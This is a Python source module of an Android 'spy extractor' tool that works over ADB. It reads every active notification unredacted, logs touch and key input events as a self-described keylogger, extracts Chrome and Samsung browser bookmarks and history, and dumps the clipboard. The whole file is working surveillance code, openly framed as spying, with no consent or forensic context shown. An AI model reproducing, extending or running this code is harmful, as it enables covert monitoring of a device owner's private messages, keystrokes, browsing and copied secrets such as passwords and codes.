"""
DroidCommand — Spy Extractor Module
Modules 5-8: Notifications, Keylogger/Touch Events, Browser History, Clipboard
"""

import subprocess
import time
import re
import os
import struct
from pathlib import Path
from config import ADB_PATH, TEMP_DIR
from adb_engine import ADBEngine

adb = ADBEngine()


# ==================== MODULE 5: NOTIFICATION INTERCEPTOR ====================

def get_notifications():
    """Read all active notifications from the device."""
    try:
        res = adb.shell("dumpsys notification --noredact", timeout=15)
        if not res["success"]:
            return {"success": False, "error": "Impossible de lire les notifications"}

        raw = res["stdout"]
        notifications = []

        # Split by NotificationRecord blocks
        blocks = re.split(r'NotificationRecord\(', raw)

        for block in blocks[1:]:  # Skip first empty split
            notif = {}

            # Extract package
            pkg_match = re.search(r'pkg=(\S+)', block)
            if pkg_match:
                notif["pkg"] = pkg_match.group(1)

            # Extract key
            key_match = re.match(r'(0x[\da-f]+:\s*)?(\S+)', block)
            if key_match:
                notif["key"] = key_match.group(0)[:80]

            # Extract title from android.title
            title_match = re.search(r'android\.title=(?:String\s*\()?(.*?)(?:\)|$)', block, re.MULTILINE)
            if title_match:
                notif["title"] = title_match.group(1).strip()[:200]

            # Extract text from android.text
            text_match = re.search(r'android\.text=(?:String\s*\()?(.*?)(?:\)|$)', block, re.MULTILINE)
            if text_match:
                notif["text"] = text_match.group(1).strip()[:500]

            # Extract timestamp
            time_match = re.search(r'postTime=(\d+)', block)
            if time_match:
                ts_ms = int(time_match.group(1))
                notif["timestamp"] = ts_ms
                notif["time_str"] = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(ts_ms / 1000))

            # Extract flags
            flags_match = re.search(r'flags=0x([0-9a-fA-F]+)', block)
            if flags_match:
                notif["flags"] = flags_match.group(1)

            # Only add if we have at least pkg and some content
            if notif.get("pkg") and (notif.get("title") or notif.get("text")):
                notifications.append(notif)

        # Deduplicate by pkg+title
        seen = set()
        unique = []
        for n in notifications:
            key = f"{n.get('pkg', '')}|{n.get('title', '')}|{n.get('text', '')}"
            if key not in seen:
                seen.add(key)
                unique.append(n)

        return {"success": True, "notifications": unique[:50], "count": len(unique)}

    except Exception as e:
        return {"success": False, "error": str(e)}


# ==================== MODULE 6: KEYLOGGER / TOUCH EVENT CAPTURE ====================

def capture_events(duration=5):
    """Capture input events (touch/key) from the device for a given duration."""
    try:
        duration = min(max(int(duration), 2), 30)  # Clamp 2-30s

        # getevent -lt gives labeled timestamps + event names
        res = subprocess.run(
            [adb.adb_path, "shell", "getevent", "-lt"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=duration + 3
        )

        output = res.stdout if res.stdout else ""
        lines = output.splitlines()

        events = []
        for line in lines:
            line = line.strip()
            if not line:
                continue

            # Parse format: [timestamp] /dev/input/eventX: TYPE CODE VALUE
            match = re.match(
                r'\[\s*([\d.]+)\]\s*(/dev/input/event\d+):\s*(\w+)\s+(\w+)\s+(\w+)',
                line
            )
            if match:
                events.append({
                    "timestamp": float(match.group(1)),
                    "device": match.group(2),
                    "type": match.group(3),
                    "code": match.group(4),
                    "value": match.group(5),
                    "raw": line[:120]
                })

        # Filter for interesting events (key presses, touches, not sync)
        filtered = [e for e in events if e["type"] not in ("EV_SYN",)]

        return {
            "success": True,
            "events": filtered[:500],
            "total_raw": len(events),
            "total_filtered": len(filtered),
            "duration": duration
        }

    except subprocess.TimeoutExpired:
        return {"success": True, "events": [], "note": "Capture terminée (timeout normal)"}
    except Exception as e:
        return {"success": False, "error": str(e)}


def stream_events_raw(duration=5):
    """Get raw getevent output as string for SSE streaming."""
    try:
        duration = min(max(int(duration), 2), 30)
        res = subprocess.run(
            [adb.adb_path, "shell", "getevent", "-lt"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=duration + 2
        )
        return {"success": True, "output": res.stdout[:10000] if res.stdout else ""}
    except subprocess.TimeoutExpired:
        return {"success": True, "output": "(capture terminée)"}
    except Exception as e:
        return {"success": False, "error": str(e)}


# ==================== MODULE 7: BROWSER HISTORY ====================

def get_browser_history():
    """Extract browser history/bookmarks from Chrome or Samsung Browser."""
    try:
        results = {
            "success": True,
            "history": [],
            "bookmarks": [],
            "source": None,
            "errors": []
        }

        # Method 1: Try content provider for bookmarks (no root needed on older Android)
        bm_res = adb.shell(
            'content query --uri content://browser/bookmarks --projection url:title:visits:date',
            timeout=10
        )
        if bm_res["success"] and bm_res["stdout"] and "No result" not in bm_res["stdout"]:
            results["source"] = "content_provider"
            for line in bm_res["stdout"].splitlines():
                entry = {}
                url_match = re.search(r'url=(.*?)(?:,\s|\s*$)', line)
                title_match = re.search(r'title=(.*?)(?:,\s|\s*$)', line)
                visits_match = re.search(r'visits=(\d+)', line)
                date_match = re.search(r'date=(\d+)', line)

                if url_match:
                    entry["url"] = url_match.group(1).strip()
                if title_match:
                    entry["title"] = title_match.group(1).strip()
                if visits_match:
                    entry["visits"] = int(visits_match.group(1))
                if date_match:
                    ts = int(date_match.group(1))
                    if ts > 1000000000000:
                        ts = ts // 1000
                    entry["date"] = time.strftime("%Y-%m-%d %H:%M", time.localtime(ts))

                if entry.get("url"):
                    results["history"].append(entry)

        # Method 2: Try Chrome via run-as (needs debuggable or root)
        if not results["history"]:
            chrome_res = adb.shell(
                'run-as com.android.chrome cat app_chrome/Default/Bookmarks 2>/dev/null | head -200',
                timeout=8
            )
            if chrome_res["success"] and chrome_res["stdout"] and len(chrome_res["stdout"]) > 10:
                results["source"] = "chrome_bookmarks_json"
                # Parse JSON bookmarks
                try:
                    import json
                    bm_data = json.loads(chrome_res["stdout"])
                    def _extract_bm(node):
                        if isinstance(node, dict):
                            if node.get("type") == "url":
                                results["bookmarks"].append({
                                    "url": node.get("url", ""),
                                    "title": node.get("name", ""),
                                    "date": node.get("date_added", "")
                                })
                            for v in node.values():
                                _extract_bm(v)
                        elif isinstance(node, list):
                            for item in node:
                                _extract_bm(item)
                    _extract_bm(bm_data)
                except (json.JSONDecodeError, Exception):
                    results["errors"].append("Chrome bookmarks trouvés mais parsing JSON échoué")

        # Method 3: Samsung Internet browser
        if not results["history"] and not results["bookmarks"]:
            sam_res = adb.shell(
                'content query --uri content://com.sec.android.app.sbrowser/bookmarks --projection url:title 2>/dev/null',
                timeout=8
            )
            if sam_res["success"] and sam_res["stdout"] and "No result" not in sam_res["stdout"]:
                results["source"] = "samsung_browser"
                for line in sam_res["stdout"].splitlines():
                    url_match = re.search(r'url=(.*?)(?:,\s|\s*$)', line)
                    title_match = re.search(r'title=(.*?)(?:,\s|\s*$)', line)
                    if url_match:
                        results["bookmarks"].append({
                            "url": url_match.group(1).strip(),
                            "title": title_match.group(1).strip() if title_match else ""
                        })

        if not results["history"] and not results["bookmarks"]:
            results["errors"].append("Aucun historique accessible (root ou run-as requis pour Chrome)")

        return results

    except Exception as e:
        return {"success": False, "error": str(e)}


# ==================== MODULE 8: CLIPBOARD MONITOR ====================

def get_clipboard():
    """Read the current clipboard content."""
    try:
        # Method 1: service call clipboard
        res = adb.shell("service call clipboard 2 s16 com.android.shell")
        content = None

        if res["success"] and res["stdout"]:
            raw = res["stdout"]
            # Parse Parcel hex output
            # Format: Result: Parcel(
            #   0x00000000: 00000000 00000003 0068006f 006c0061 '........h.o.l.a.'
            # )
            hex_chunks = re.findall(r"([0-9a-fA-F]{8})\s+([0-9a-fA-F]{8})\s+([0-9a-fA-F]{8})\s+([0-9a-fA-F]{8})", raw)

            if hex_chunks:
                all_hex = ""
                for chunk in hex_chunks:
                    all_hex += "".join(chunk)

                # Skip first 8 bytes (status + length), decode rest as UTF-16LE
                try:
                    raw_bytes = bytes.fromhex(all_hex[16:])  # Skip status + string length
                    decoded = raw_bytes.decode("utf-16-le", errors="replace")
                    # Strip null terminators and control chars
                    decoded = decoded.replace("\x00", "").strip()
                    if decoded and len(decoded) > 0:
                        content = decoded
                except (ValueError, UnicodeDecodeError):
                    pass

        # Method 2 fallback: dumpsys clipboard
        if content is None:
            dump_res = adb.shell("dumpsys clipboard")
            if dump_res["success"] and dump_res["stdout"]:
                # Look for primary clip text
                text_match = re.search(r'mPrimaryClip=ClipData.*?{.*?T:(.*?)}', dump_res["stdout"], re.DOTALL)
                if text_match:
                    content = text_match.group(1).strip()[:1000]

                if not content:
                    text_match2 = re.search(r'mText=(.*?)(?:\n|$)', dump_res["stdout"])
                    if text_match2:
                        content = text_match2.group(1).strip()[:1000]

        if content:
            return {"success": True, "content": content, "length": len(content)}
        else:
            return {"success": True, "content": "", "length": 0, "note": "Presse-papier vide"}

    except Exception as e:
        return {"success": False, "error": str(e)}
